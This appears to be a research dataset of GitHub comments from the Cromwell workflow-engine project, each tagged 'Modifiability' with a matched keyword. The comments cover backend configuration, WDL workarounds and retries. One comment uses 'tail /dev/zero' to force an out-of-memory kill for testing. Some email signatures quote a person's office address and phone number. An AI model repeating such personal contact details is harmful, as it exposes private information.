Modifiability,"I haven't rebased the rebase here yet, I'm hoping that's the problem. :smile: At the time of this writing these diffs are a hot mess. Hmm now that you mention it that should probably be called something like `EnhancedFutureFuture`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-164934352:209,Enhance,EnhancedFutureFuture,209,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-164934352,1,['Enhance'],['EnhancedFutureFuture']
Modifiability,"I included some changes in #4961 that might work for this enhancement request. The changes in that PR publish ""workflowProcessingEvents"" for workflow pickup, release, and completion. The first two events types can be multi-valued since Cromwell can be restarted and possibly upgraded during the execution of a workflow. Sample metadata from a simple run:. ```; {; ""workflowName"": ""wf_hello"",; ""workflowProcessingEvents"": [; {; ""cromwellId"": ""cromid-4db4123"",; ""timestamp"": ""2019-05-13T15:00:22.152Z"",; ""cromwellVersion"": ""41-07606c8-SNAP"",; ""description"": ""Finished""; },; {; ""cromwellId"": ""cromid-4db4123"",; ""description"": ""PickedUp"",; ""timestamp"": ""2019-05-13T15:00:10.879Z"",; ""cromwellVersion"": ""41-07606c8-SNAP""; }; ],; ...; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4668#issuecomment-491862476:58,enhance,enhancement,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4668#issuecomment-491862476,1,['enhance'],['enhancement']
Modifiability,"I just gave this a try in my facility. It still fails. My current work around is to use cromwell version 0.32 (via conda package). Cheers. On Tue, 19 Feb 2019 at 15:53, Michael Franklin <notifications@github.com>; wrote:. > Able to replicate the break from v36 to v37, I switched my check-alive in; > my config to use scontrol and it succeeded:; >; > ""check-alive"": ""scontrol show job ${job_id}"",; >; > —; > You are receiving this because you authored the thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-464982252>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/AAdrHHALXNpvY-NDgAF3uYIRY7EyP3zqks5vO4M_gaJpZM4aEezy>; > .; >. -- ; Nicholas Yue; Graphics - Arnold, Alembic, RenderMan, OpenGL, HDF5; Custom Dev - C++ porting, OSX, Linux, Windows; http://au.linkedin.com/in/nicholasyue; https://vimeo.com/channels/naiadtools",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-465869573:304,config,config,304,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-465869573,1,['config'],['config']
Modifiability,"I just modified it in my code and WDL. No big deal. On Wed, Dec 7, 2016 at 3:13 PM, kshakir <notifications@github.com> wrote:. > I used this command for the task run_plot_purity_series, and got a run of; > the workflow to exit with succeeded for me. Ran with; > cromwell-24-b3e07d2-SNAP.jar.; >; > This new command changes the file names to get rid of spaces:; >; > command {; > python <<CODE; > files = ""${sep="","" amp_sens_prec}"".split("",""); > files.extend(""${sep="","" del_sens_prec}"".split("","")); > with open(""sens_prec_aggregate.txt"", ""w"") as fp:; > 	 fp.write('\n'.join(files)); > CODE; > wc -l sens_prec_aggregate.txt; >; > python <<CODE; > files = ""${sep="","" small_sens}"".split("",""); > with open(""small_sens_aggregate.txt"", ""w"") as fp:; > 	 fp.write('\n'.join(files)); > CODE; > wc -l small_sens_aggregate.txt; >; > run_plot_purity_series sens_prec_aggregate.txt small_sens_aggregate.txt /root/eval-gatk-protected/sample_purity_table.tsv purity_plots/; >; > # Rename files to get rid of spaces; > mv 'purity_plots/purity_series_small_Small Amplifications.png' 'purity_plots/purity_series_small_Small_Amplifications.png'; > mv 'purity_plots/purity_series_small_Small Deletions.png' 'purity_plots/purity_series_small_Small_Deletions.png'; > }; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/1754#issuecomment-265560268>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk7v2Tv0V0uA75r0QmSydOvXRrWnvks5rFxNxgaJpZM4LGJFu>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 7003EB; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1754#issuecomment-265561480:451,extend,extend,451,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1754#issuecomment-265561480,1,['extend'],['extend']
Modifiability,I just ran into the problem of an SGE node crash that we didn't find out until we wondered why certain jobs took so long to run. Having the `is-alive` command and check run at a configurable poll interval would be really usefull for me. Having a poll interval of 0 by default (i.e. turned off) and the value in hours/days could leave it configurable without overloading the queque masters. But as Uncle Ben said: With great power...,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-413172161:178,config,configurable,178,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-413172161,2,['config'],['configurable']
Modifiability,"I just ran into this as well--cromwell does not work on OSes without `/bin/bash`. `/usr/bin/env bash` is more portable and IMHO the better option. The following fails to execute for me:. ```; workflow myWorkflow {; call myTask; }. task myTask {; command {; echo ""hello world""; }; output {; String out = read_string(stdout()); }; }; ```. Unfortunately this precludes me from using Cromwell.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3201#issuecomment-579545087:110,portab,portable,110,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3201#issuecomment-579545087,1,['portab'],['portable']
Modifiability,I like the tests - should make it harder to accidentally rebase/merge config incorrectly in the future. :+1:,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/349#issuecomment-169106882:70,config,config,70,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/349#issuecomment-169106882,1,['config'],['config']
Modifiability,"I may have found a quick fix actually (will confirm in the morning).; In the meantime I think you could work around it by re-declaring `GetBwaVersion.version` as a new variable inside the scatter and using that instead of `GetBwaVersion.version` directly:. ```; call GetBwaVersion. # Align flowcell-level unmapped input bams in parallel; scatter (unmapped_bam in flowcell_unmapped_bams) {; String bwaVersion = GetBwaVersion.version; ; ... if (unmapped_bam_size > cutoff_for_large_rg_in_gb) {; # Split bam into multiple smaller bams,; # map reads to reference and recombine into one bam; call splitRG.SplitLargeRG as SplitRG {; input:; input_bam = unmapped_bam,; bwa_commandline = bwa_commandline,; bwa_version = bwaVersion,; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3156#issuecomment-358537997:168,variab,variable,168,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3156#issuecomment-358537997,1,['variab'],['variable']
Modifiability,"I might have missed it -- can you put together the files so we can; reproduce this (cromwell configuration, WDL and json)? We might need some; permissions, but I want to run this sort of thing continually. ---. Kristian Cibulskis; Chief Architect, Data Sciences & Data Engineering; Broad Institute of MIT and Harvard; kcibul@broadinstitute.org. On Tue, Nov 8, 2016 at 12:32 PM, Lee Lichtenstein notifications@github.com; wrote:. > N=4/4 on my workflow...; > ; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-259203566,; > or mute the thread; > https://github.com/notifications/unsubscribe-auth/ABW4gwHvsAAXHshNNM4GFWqWhx1Cvrsgks5q8LI_gaJpZM4Ko1_r; > .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-259207344:93,config,configuration,93,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-259207344,1,['config'],['configuration']
Modifiability,I noticed we don't get test details in CircleCI. We might be able to if we configure `store_test_results` with `centaur/target/test-reports`: https://circleci.com/docs/2.0/configuration-reference/#store_test_results,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777799687:75,config,configure,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777799687,2,['config'],"['configuration-reference', 'configure']"
Modifiability,I placed the configuration option into backend/abortJobsOnTerminate. If you guys want me to move or rename it to something else I'm happy to.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-175077183:13,config,configuration,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-175077183,1,['config'],['configuration']
Modifiability,"I ran into this again today, unless the server stdout is captured the errors don't make their way to workflow logs so it's particularly annoying to debug failed workflows. As a user, I would expect that either all logs (both pertaining to the workflow, or the server's execution of the workflow) are placed in the workflow log, or there is a separately configurable server log file for that stream of information.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4310#issuecomment-480382172:353,config,configurable,353,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4310#issuecomment-480382172,1,['config'],['configurable']
Modifiability,"I read this as complaining about having all of the separate calls + the logic to dig into the config everywhere, not a complaint about physically loading the config. That said, having looked at this w/ that lens a few times I never saw a way that'd work everywhere which would be better than doing the above",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/796#issuecomment-234340037:94,config,config,94,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/796#issuecomment-234340037,2,['config'],['config']
Modifiability,"I solved this issue on my workstation by passing the $EUID variable as the docker_user parameter in the backend.providers.LocalExample.config section of the configuration file: ; ```; runtime-attributes = """"""; String? docker; #String? docker_user # Uncommenting to try the EUID fix for root files and inability to hardlink; String docker_user = ""$EUID""; """"""; ```; After that, docker outputs were no longer owned by root. . Hope it helps!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6094#issuecomment-764894141:59,variab,variable,59,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6094#issuecomment-764894141,3,"['config', 'variab']","['config', 'configuration', 'variable']"
Modifiability,"I suggested in standup today that a batching solution like that in [WriteMetadataActor](https://github.com/broadinstitute/cromwell/blob/develop/services/src/main/scala/cromwell/services/metadata/impl/WriteMetadataActor.scala) might help here. i.e. don't sweep the execution store every single time any job changes status, but instead sweep based on a timer and a `var shouldCheckForRunnableJobs: Boolean` variable. Whenever a job changes status `shouldCheckForRunnableJobs` would be assigned `true`. When the timer goes off and if that variable is `true`, check the store for runnable jobs. edit: everywhere I wrote ""changes status"" I meant ""changes to a terminal status""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-285708800:405,variab,variable,405,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-285708800,2,['variab'],['variable']
Modifiability,"I think I agree with @vsoch on this. For now, I think our PR (#4635) should probably also have a change to `cromwell.examples.conf` so that all the types of config are in the same place. In the long term, they should probably be split out into separate files in a directory as she suggested. That said, I would also ideally like a file or document that explains *every* possible config option that Cromwell understands. At the moment `cromwell.examples.conf` serves this role (in a confusing way), but we would need a replacement if it's split out into separate files.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-468851162:157,config,config,157,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-468851162,2,['config'],['config']
Modifiability,I think I agree with Chris re: the limit should be configurable,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1762#issuecomment-294810629:51,config,configurable,51,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1762#issuecomment-294810629,1,['config'],['configurable']
Modifiability,"I think I found the one you are talking about. ![screen shot 2018-10-15 at 11 28 47 am](https://user-images.githubusercontent.com/2978948/46960909-92efc580-d06d-11e8-97fe-d81ef63da81a.png). The failure reason is . ```; Task requester_pays_engine_functions.functions:NA:1 failed. The job was stopped before the command finished. PAPI error code 2. Execution failed: pulling image: docker pull: running [""docker"" ""pull"" ""ubuntu@sha256:de774a3145f7ca4f0bd144c7d4ffb2931e06634f11529653b23eba85aef8e378""]: exit status 1 (standard error: ""error pulling image configuration: received unexpected HTTP status: 502 Bad Gateway...; ```. which is not related to the requester pays feature but rather yet another dockerhub flaky response that we should ask google to retry IMO.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4233#issuecomment-429901811:553,config,configuration,553,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4233#issuecomment-429901811,1,['config'],['configuration']
Modifiability,"I think disabling call caching will also disable hashing (but I could be wrong), because I believe the only thing the hashes are used for is call caching. https://cromwell.readthedocs.io/en/stable/cromwell_features/CallCaching/. If that's not the case, I think you could fork cromwell and modify the backend for file system to use an alternate method, such as looking for a .md5 file alongside the file the hash is looking. (Actually, it looks like the backend already has code to do this, see: https://github.com/broadinstitute/cromwell/blob/develop/supportedBackends/sfs/src/main/scala/cromwell/backend/impl/sfs/config/ConfigHashingStrategy.scala#L52 ). Also see https://cromwell.readthedocs.io/en/stable/Configuring/#local-filesystem-options",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-799603780:614,config,config,614,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-799603780,3,"['Config', 'config']","['ConfigHashingStrategy', 'Configuring', 'config']"
Modifiability,"I think in general the number of concurrent jobs is determined by both of client side (cromwell) and server side(aws batch). In cormwell, there should be a rate limit of api call (no matter it is job submission or job status query) to avoid DDoS to the server side. On the server side like aws batch, there is also a config for rate limit of concurrent api call, if the number of concurrent api call exceeds the rate limit of server side, the server side may refuse to server so it is important not to set rate limit on the client side/cromwell over the server side rate limit. While on server side, if the concurrent jobs require more resources than the limit such as cpus and mem (compute env in aws batch) , it is the server side responsibility to put the concurrent jobs to queue and make sure they can be launched later when resource is available rather than throwing errors unless the queue is expired (say, resource is still not available one week later). IMHO, aws batch backend should implement the scatter jobs in array jobs which support multiple jobs submission and status query in one single api call, otherwise, it is too easy to exceed the rate limit of aws batch. jobs submission by user --> cromwell (rate limit config) --> aws batch gateway (rate limit config) --> aws batch compute env (resource limit)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-444666395:317,config,config,317,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-444666395,3,['config'],['config']
Modifiability,I think it'd be good to right at the top make a big point about the number one 'feature' here is enhanced performance and scalability,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1477#issuecomment-249003742:97,enhance,enhanced,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1477#issuecomment-249003742,1,['enhance'],['enhanced']
Modifiability,"I think technically these could be collapsed into one class, but from your description maybe it's preferable to keep this structure with the roles of the classes more clearly articulated? The outer actor has the responsibility of implementing the `BackendJobExecutionActor` trait, but can be implemented as a simple adapter to any backend-specific means of executing jobs, which here just happens to be an FSM. Not sure what the best nomenclature would be for this distinction.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/734#issuecomment-214527720:316,adapt,adapter,316,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/734#issuecomment-214527720,1,['adapt'],['adapter']
Modifiability,"I think that defaults should be allowed to be overridden, even if the default value is based on another variable. Not sure I agree with the logic to prevent that.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2565#issuecomment-323832181:104,variab,variable,104,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2565#issuecomment-323832181,1,['variab'],['variable']
Modifiability,"I think the cache is unrelated, this is purely input localisation. I re-ran the job with caching disabled in the config file. The same error occurs. From this directory: /share/ScratchGeneral/evaben/cromwell/cromwell-executions/PreProcessingForVariantDiscovery_GATK4/37e4e046-b256-4f81-95c6-9f0c915810bf/call-SamToFastqAndBwaMem/inputs/-21323395 . There is a file 'cromwell.tmp' which seems to be a partial copy of my cromwell process' CWD. All of the logs are copied in, (cromwell.tmp/cromwell-workflow-logs/) and a single seemingly unrelated job (cromwell.tmp/cromwell-executions/HaplotypeCallerGvcf_GATK4/f18cded7-24ae-470d-b58d-d87ce97f21cb/call-HaplotypeCaller/shard-6/). All of that jobs 'execution' folder, and some of its 'inputs' are copied. It is not clear if more would have been copied in or if the process was ended by the soft link error mentioned above.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3825#issuecomment-401217803:113,config,config,113,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3825#issuecomment-401217803,1,['config'],['config']
Modifiability,"I think there was something about this being discussed by @cjllanwarne regarding input checking in the winstanley plugin, maybe?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3503#issuecomment-382870074:114,plugin,plugin,114,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3503#issuecomment-382870074,1,['plugin'],['plugin']
Modifiability,"I think this is a really cool idea! It feels somewhat above the scope of Cromwell itself (since it's calling Cromwell rather than part of it) but as part of the [openWDL](https://github.com/openwdl/wdl) ecosystem I think it's an awesome thing to have. I suggest getting in touch with @mlin and @dinvlad for the following reasons:. > What do you think? I am excited to implement the full solution, it should not take more than a few hours. * I mention @dinvlad because he's been working on a plugin for VS Code with a WDL debugging option for WDL files. It could be that there's a fair amount of crossover you could take advantage of. > Can I use this parser? https://github.com/TMiguelT/WdlParserPackaging. * @mlin has a much friendlier WDL parsing library over at [miniWDL](https://github.com/chanzuckerberg/miniwdl/). I suspect you'll have a much better time using that parser API.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5029#issuecomment-501755712:491,plugin,plugin,491,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5029#issuecomment-501755712,1,['plugin'],['plugin']
Modifiability,I think we actually don't need an explicit listing of the supported regions at all (even in the config) and can have Cromwell use the right hostname based on what's in the docker string,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4466#issuecomment-445296307:96,config,config,96,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4466#issuecomment-445296307,1,['config'],['config']
Modifiability,I thought I would be able to get a similar effect by using ; 'run-in-background = true'; and (for SGE anyway) 'qsub -sync y' in my config. Can anyone explain why that did not work?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-380675072:131,config,config,131,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-380675072,1,['config'],['config']
Modifiability,I tried the local version variable and it doesn't seem to work but I could be doing it wrong. We can talk faces real quick to make sure I at least tried it correctly.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3156#issuecomment-358618004:26,variab,variable,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3156#issuecomment-358618004,1,['variab'],['variable']
Modifiability,"I use this config in a SGE backend for singularity. ```; Singularity {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; concurrent-job-limit = 100; exit-code-timeout-seconds = 120; runtime-attributes = """"""; String sif; Float? memory_gb; String? bind_path; """""". submit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; ${""-l mem_free="" + memory_gb + ""g""} \; singularity exec -e --bind ${cwd}:${cwd} \; ${""--bind "" + bind_path} \; ${sif} \; ${job_shell} ${script}; """""". job-id-regex = ""(\\d+)""; check-alive = ""qstat -j ${job_id}""; kill = ""qdel ${job_id}""; }; }; ```; Every task should have a `String sif`, point to the path to sif file. You can modify this according to your need.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1188515048:11,config,config,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1188515048,4,"['Config', 'config']","['ConfigBackendLifecycleActorFactory', 'config']"
Modifiability,"I used a custom config file:. ```; akka {; loggers = [""akka.event.slf4j.Slf4jLogger""]; logging-filter = ""akka.event.slf4j.Slf4jLoggingFilter""; }. spray.can {; server {; request-timeout = 40s; }; client {; request-timeout = 40s; connecting-timeout = 40s; }; }. backend {; providers {; Local {; config {; submit-docker = ""docker run --rm -v ${cwd}:${docker_cwd} -i ${docker} /bin/bash ${docker_cwd}/execution/script""; }; }; }; }; ```. I'm happy to submit a PR to `core/src/main/resources/reference.conf` if that's helpful, but it would basically just replace the `submit-docker` line with the one above.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1556#issuecomment-253004034:16,config,config,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1556#issuecomment-253004034,2,['config'],['config']
Modifiability,"I used this command for the task `run_plot_purity_series`, and got a run of the workflow to exit with succeeded for me. Ran with `cromwell-24-b3e07d2-SNAP.jar`. This new command changes the file names to get rid of spaces:. ```; command {; python <<CODE; files = ""${sep="","" amp_sens_prec}"".split("",""); files.extend(""${sep="","" del_sens_prec}"".split("","")); with open(""sens_prec_aggregate.txt"", ""w"") as fp:; 	 fp.write('\n'.join(files)); CODE; wc -l sens_prec_aggregate.txt. python <<CODE; files = ""${sep="","" small_sens}"".split("",""); with open(""small_sens_aggregate.txt"", ""w"") as fp:; 	 fp.write('\n'.join(files)); CODE; wc -l small_sens_aggregate.txt. run_plot_purity_series sens_prec_aggregate.txt small_sens_aggregate.txt /root/eval-gatk-protected/sample_purity_table.tsv purity_plots/. # Rename files to get rid of spaces; mv 'purity_plots/purity_series_small_Small Amplifications.png' 'purity_plots/purity_series_small_Small_Amplifications.png'; mv 'purity_plots/purity_series_small_Small Deletions.png' 'purity_plots/purity_series_small_Small_Deletions.png'; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1754#issuecomment-265560268:308,extend,extend,308,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1754#issuecomment-265560268,1,['extend'],['extend']
Modifiability,"I wanted to second this, as we're setting the same issue submitting to PBSPro clusters; with the latest Cromwell development version. Looking through the code, it appears to; originate from https://github.com/broadinstitute/cromwell/blob/33c58ef22b6a8edc4c1912c1416225c79d298f76/supportedBackends/sfs/src/main/scala/cromwell/backend/impl/sfs/config/ConfigAsyncJobExecutionActor.scala; which was tweaked since the last release in a change from @cjllanwarne (https://github.com/broadinstitute/cromwell/commit/33c58ef22b6a8edc4c1912c1416225c79d298f76#diff-39fe7186c2383fc1135f29a9c05e4e57) but I don't; grasp the scope of the change enough to know if this triggers it. In our CWL run, the jobs get submitted to the cluster and run okay based on the; work directories in `cromwell-execution` but the polling dies with:; ```; [2019-01-17 12:34:15,18] [info] DispatchedConfigAsyncJobExecutionActor [ESC[38;5;2mf2e0c573ESC[0malignment_to_rec:NA:1]: Status change from - to Running; [2019-01-17 12:34:16,27] [ESC[38;5;220mwarnESC[0m] DispatchedConfigAsyncJobExecutionActor [ESC[38;5;2mf2e0c573ESC[0malignment_to_rec:NA:1]: Fatal exception polling for status. Job will fail.; java.util.concurrent.ExecutionException: Boxed Error; at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); at scala.concurrent.Promise$.fromTry(Promise.scala:138); at scala.concurrent.Future$.fromTry(Future.scala:635); at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:691); at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:691); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecu",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345:342,config,config,342,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345,2,"['Config', 'config']","['ConfigAsyncJobExecutionActor', 'config']"
Modifiability,"I was working with @ruchim to refactor this a bit, got distracted and now she's away for a few days. @kcibul am I correct in remembering that this isn't particularly high priority? If I'm right, I can work with her on Monday on this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/841#issuecomment-220142251:30,refactor,refactor,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/841#issuecomment-220142251,1,['refactor'],['refactor']
Modifiability,I would agree w/ @patmagee that this is a matter for the OpenWDL group. Any Cromwell-level constructs to get at the underlying functionality would require non-portable WDLs to be written. I'll tag @cjllanwarne in case he has any clever ideas on how to express the concept in portable WDL in a less sucky way. I disagree with @patmagee that WDL should steer clear of the concept - IMO not doing this in the first place was one of the larger mistakes we made in the early days of WDL. Perhaps something with `Object`. We're seeing something similar play out in GA4GH land w/ DRS ... the concept of a file bundle seems inescapable and it's not quite the same thing as `Directory`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2269#issuecomment-464351564:159,portab,portable,159,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2269#issuecomment-464351564,2,['portab'],['portable']
Modifiability,"I would like to add my support to Greg's question. The. memory_retry_multiplier. config option would be a super-super useful feature to use for genomic workflows with varying data sises. If it is working on GCP, ould you please document it's use better? Or let us know if it is an abandonned feature.. Or even better send us working examples :). Thanks for all the work you do.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7451#issuecomment-2284350841:81,config,config,81,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7451#issuecomment-2284350841,1,['config'],['config']
Modifiability,"I would like to reopen this issue. I have been testing the `memory-retry` feature since it should be very useful for my project on GCP. However, Cromwell does not retry any job exited with SIGKILL (`137`) and all jobs killed by an OOM-killer get `137` as an exit-code. So this `memory-retry` feature doesn't work at all. And I found this.; https://github.com/broadinstitute/cromwell/blob/171f12c890373e896b4eab1f9f4ad23660dc80f3/supportedBackends/sfs/src/main/scala/cromwell/backend/impl/sfs/config/ConfigAsyncJobExecutionActor.scala#L308. So even though I configure the two `memory-retry` parameters correctly in `backend.conf` and workflow options JSON. it's useless. Cromwell does not retry any job exited with `137`. . I tested with a fake OOM with exit code `1` and `137` and Cromwell retried the task with exit code `1` only.; ```; version 1.0. workflow mem_retry {; call fail_with_fake_oom; call fail_with_true_oom; }. task fail_with_fake_oom {; command <<<; set -e. TOTAL_MEMORY=$(free -m | awk 'FNR == 2 {print $2}'); echo ""instance memory: $TOTAL_MEMORY""; if [[ ""$TOTAL_MEMORY"" > 2500 ]]; then; echo ""Not killed""; else; >&2 echo ""Killed""; exit 137 # cromwell does not retry the task if it gets 137; #exit 1 # cromwell retries the task if it gets 1 ; fi; >>>; runtime {; cpu: 1; memory: ""2 GB""; docker: ""ubuntu:latest""; maxRetries: 2; }; }. task fail_with_true_oom {; command <<<; set -e. TOTAL_MEMORY=$(free -m | awk 'FNR == 2 {print $2}'); echo ""instance memory: $TOTAL_MEMORY""; if [[ ""$TOTAL_MEMORY"" > 2500 ]]; then; echo ""Not killed""; else; # This one-liner triggers OOM and hence 137 (SIGKILL); # https://askubuntu.com/a/823798; tail /dev/zero; fi. >>>; runtime {; cpu: 1; memory: ""2 GB""; docker: ""ubuntu:latest""; maxRetries: 2; }; }. ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5815#issuecomment-811394372:492,config,config,492,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5815#issuecomment-811394372,3,"['Config', 'config']","['ConfigAsyncJobExecutionActor', 'config', 'configure']"
